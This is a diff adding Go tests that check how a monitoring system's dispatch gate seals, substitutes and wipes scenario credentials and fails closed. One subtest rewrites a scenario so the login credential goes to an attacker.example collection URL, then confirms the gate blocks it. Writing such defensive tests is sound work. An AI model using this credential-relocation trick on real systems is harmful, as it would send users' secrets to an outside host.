@@ -2,6 +2,7 @@ package dispatch
 
 import (
 	"bytes"
+	"strings"
 	"testing"
 
 	"github.com/teamlead-com/cerbix/internal/domain"
@@ -312,4 +313,144 @@ func TestEnvelopeCarrierIgnoresInlineCredential(t *testing.T) {
 	if _, err := ValidateAndMaterialize(credentialTestRing(t), DeliveredJob{Job: job, CarrierGeneration: ProtocolV2}); err == nil {
 		t.Fatal("generation-2 carrier accepted an inline credential instead of requiring the envelope")
 	}
+}
+
+// FR-028 stage 2 at the executor gate. A synthetic monitor's credential is a NAMED BINDING:
+// the envelope carries one field per binding, the gate demands exactly that set, and the
+// value is substituted INTO the scenario rather than left beside it as a config key that
+// nothing wipes.
+func syntheticBindingJob(t *testing.T, ring *CredentialKeyring, scenario string) CheckJob {
+	t.Helper()
+	monitor := domain.Monitor{
+		ID: "33333333-3333-3333-3333-333333333333", Region: "core", ExecutionRevision: 3,
+		Type: domain.MonitorSynthetic,
+		Config: map[string]string{
+			domain.SyntheticScenarioKey:          scenario,
+			domain.ScenarioSecretRefKey("login"): "login-token",
+		},
+	}
+	envelope, err := ring.Seal(SealContext{
+		EnvelopeVersion: EnvelopeV2, Region: monitor.Region, JobID: "job-syn",
+		MonitorID: monitor.ID, Revision: monitor.ExecutionRevision, Body: monitor,
+	}, map[string][]byte{domain.ScenarioBindingField("login"): []byte(`s3cr3t"quoted`)})
+	if err != nil {
+		t.Fatal(err)
+	}
+	return CheckJob{Monitor: monitor, ProtocolVersion: ProtocolV2, CredentialEnvelope: envelope}
+}
+
+func TestScenarioBindingIsSubstitutedIntoTheScenario(t *testing.T) {
+	ring := credentialTestRing(t)
+	scenario := `{"steps":[{"url":"https://api.internal/login","headers":{"authorization":"{{secret:login}}"}}]}`
+	job := syntheticBindingJob(t, ring, scenario)
+
+	got, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV2})
+	if err != nil {
+		t.Fatalf("a declared binding must materialize: %v", err)
+	}
+	if !got.UsedCredential {
+		t.Fatal("a scenario binding is a credential: readiness accounting depends on this")
+	}
+	out := got.Monitor.Config[domain.SyntheticScenarioKey]
+	if strings.Contains(out, "{{secret:login}}") {
+		t.Fatalf("the placeholder survived: %s", out)
+	}
+	// JSON-escaped, because a credential may carry a quote and the scenario is a document.
+	if !strings.Contains(out, `s3cr3t\"quoted`) {
+		t.Fatalf("the value was not substituted or not escaped: %s", out)
+	}
+	// The value must NOT sit beside the scenario under its own key: that copy is one nobody
+	// wipes and one that a log of the config would print.
+	if _, leaked := got.Monitor.Config[domain.ScenarioBindingField("login")]; leaked {
+		t.Fatal("the binding value was injected as a config key as well as into the scenario")
+	}
+	// And the substituted document is still parseable, which is what the prober needs.
+	if _, err := domain.ParseScenario(got.Monitor.Config); err != nil {
+		t.Fatalf("the substituted scenario no longer parses: %v", err)
+	}
+
+	got.Cleanup()
+	if _, still := got.Monitor.Config[domain.SyntheticScenarioKey]; still {
+		t.Fatal("cleanup left the substituted scenario in the materialized config")
+	}
+}
+
+// The gate's fail-closed cases for a binding, each of which would otherwise probe with a
+// broken or attacker-chosen credential.
+func TestScenarioBindingGateFailsClosed(t *testing.T) {
+	ring := credentialTestRing(t)
+	scenario := `{"steps":[{"url":"https://api.internal/login","headers":{"authorization":"{{secret:login}}"}}]}`
+
+	t.Run("no envelope", func(t *testing.T) {
+		job := syntheticBindingJob(t, ring, scenario)
+		job.CredentialEnvelope = nil
+		if _, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV2}); err == nil {
+			t.Fatal("a declared binding with no envelope must refuse: the placeholder would be sent verbatim")
+		}
+	})
+
+	t.Run("legacy carrier", func(t *testing.T) {
+		job := syntheticBindingJob(t, ring, scenario)
+		if _, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV1}); err == nil {
+			t.Fatal("a binding has no legacy inline form and must refuse on a generation-1 carrier")
+		}
+	})
+
+	t.Run("envelope that does not bind the body", func(t *testing.T) {
+		// EnvelopeV1 carries no body digest, so a relocation would go undetected. A binding
+		// must refuse that envelope rather than run with a credential nothing pins to a target.
+		monitor := domain.Monitor{
+			ID: "55555555-5555-5555-5555-555555555555", Region: "core", ExecutionRevision: 1,
+			Type: domain.MonitorSynthetic,
+			Config: map[string]string{
+				domain.SyntheticScenarioKey:          scenario,
+				domain.ScenarioSecretRefKey("login"): "login-token",
+			},
+		}
+		envelope, err := ring.Seal(SealContext{
+			EnvelopeVersion: EnvelopeV1, Region: monitor.Region, JobID: "job-v1",
+			MonitorID: monitor.ID, Revision: monitor.ExecutionRevision, Body: monitor,
+		}, map[string][]byte{domain.ScenarioBindingField("login"): []byte("value")})
+		if err != nil {
+			t.Fatal(err)
+		}
+		job := CheckJob{Monitor: monitor, ProtocolVersion: ProtocolV2, CredentialEnvelope: envelope}
+		if _, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV2}); err == nil {
+			t.Fatal("a binding must refuse an envelope that does not bind the execution body")
+		}
+	})
+
+	t.Run("relocated placeholder", func(t *testing.T) {
+		// The attack D8a exists for: a VALID envelope, and the scenario rewritten so the
+		// credential lands in a request of the attacker's choosing. The body digest covers
+		// the scenario, so the AEAD fails before any request.
+		job := syntheticBindingJob(t, ring, scenario)
+		job.Monitor.Config[domain.SyntheticScenarioKey] =
+			`{"steps":[{"url":"https://attacker.example/collect","headers":{"authorization":"{{secret:login}}"}}]}`
+		if _, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV2}); err == nil {
+			t.Fatal("a relocated placeholder under a valid envelope must fail the gate")
+		}
+	})
+
+	t.Run("envelope field the scenario does not use", func(t *testing.T) {
+		monitor := domain.Monitor{
+			ID: "44444444-4444-4444-4444-444444444444", Region: "core", ExecutionRevision: 1,
+			Type: domain.MonitorSynthetic,
+			Config: map[string]string{
+				domain.SyntheticScenarioKey:          `{"steps":[{"url":"https://x"}]}`,
+				domain.ScenarioSecretRefKey("login"): "login-token",
+			},
+		}
+		envelope, err := ring.Seal(SealContext{
+			EnvelopeVersion: EnvelopeV2, Region: monitor.Region, JobID: "job-unused",
+			MonitorID: monitor.ID, Revision: monitor.ExecutionRevision, Body: monitor,
+		}, map[string][]byte{domain.ScenarioBindingField("login"): []byte("value")})
+		if err != nil {
+			t.Fatal(err)
+		}
+		job := CheckJob{Monitor: monitor, ProtocolVersion: ProtocolV2, CredentialEnvelope: envelope}
+		if _, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV2}); err == nil {
+			t.Fatal("an envelope field with no placeholder to fill is a mismatch, not something to ignore")
+		}
+	})
 }
